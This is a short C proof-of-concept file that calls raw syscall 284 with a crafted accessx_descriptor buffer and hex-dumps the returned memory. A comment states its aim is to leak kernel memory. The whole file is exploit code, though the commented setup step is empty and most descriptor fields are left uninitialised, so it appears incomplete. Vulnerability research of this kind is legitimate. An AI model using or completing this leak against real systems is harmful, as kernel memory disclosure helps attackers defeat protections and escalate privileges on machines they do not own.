#include <stdlib.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <errno.h>
#include <sys/unistd.h>
#include "hex.h"


int main(){
	size_t size = sizeof(struct accessx_descriptor)*2 + 0x30;
	struct accessx_descriptor * accessx = malloc(size);
	accessx->ad_name_offset = sizeof(struct accessx_descriptor);

	// setup accessx to leak	


	char *result = malloc(0x200);
	memset(result, 0, 0x200);
	if(syscall(284, accessx, size, result, 0)){
		perror("allocation");
	}
	DumpHex(result, 0x200);
}
